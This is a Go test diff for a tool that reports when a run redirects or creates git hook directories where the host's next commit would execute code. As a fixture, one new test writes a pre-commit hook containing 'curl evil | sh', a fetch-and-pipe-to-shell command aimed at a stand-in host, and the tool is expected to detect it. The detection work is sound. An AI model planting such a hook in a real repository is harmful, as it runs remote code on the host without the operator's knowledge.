@@ -167,8 +167,43 @@ func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
 	git("init", "-q")
 	git("config", "core.hooksPath", other)
 
-	if got := before.changed(writes); len(got) != 0 {
-		t.Errorf("a hooks path the RUN set must not pull another grant's contents into the report, got %v", got)
+	// The directory, and only the directory. Naming the files inside it would report a
+	// pre-existing file as newly created, since the baseline never stamped it; naming
+	// nothing would leave the operator unaware that the run chose where the host's next
+	// commit executes from.
+	got := before.changed(writes)
+	if !slices.Equal(got, []string{other}) {
+		t.Errorf("changed = %v, want just the redirected hooks directory %v", got, []string{other})
+	}
+	if slices.Contains(got, filepath.Join(other, "already-here")) {
+		t.Error("a file the baseline never stamped must not be reported as one the run created")
+	}
+}
+
+// The same redirection reached the other way: no repo above the grant, so the run makes
+// one and its .git/hooks becomes the host's hook directory. There was no .git at
+// preflight, so gitDirShields carved nothing and no shield holds it down - which is
+// exactly why the report has to name it.
+func TestHooksInARunCreatedRepoAreReported(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	grant := t.TempDir()
+	writes := []string{grant}
+	before := baselineAutoExec(writes)
+
+	cmd := exec.Command("git", "init", "-q")
+	cmd.Dir = grant
+	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
+	if out, err := cmd.CombinedOutput(); err != nil {
+		t.Fatalf("git init: %v\n%s", err, out)
+	}
+	if err := os.WriteFile(filepath.Join(grant, ".git", "hooks", "pre-commit"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	if got := before.changed(writes); !slices.Contains(got, filepath.Join(grant, ".git", "hooks")) {
+		t.Errorf("a hooks directory the run created must be named; got %v", got)
 	}
 }
 
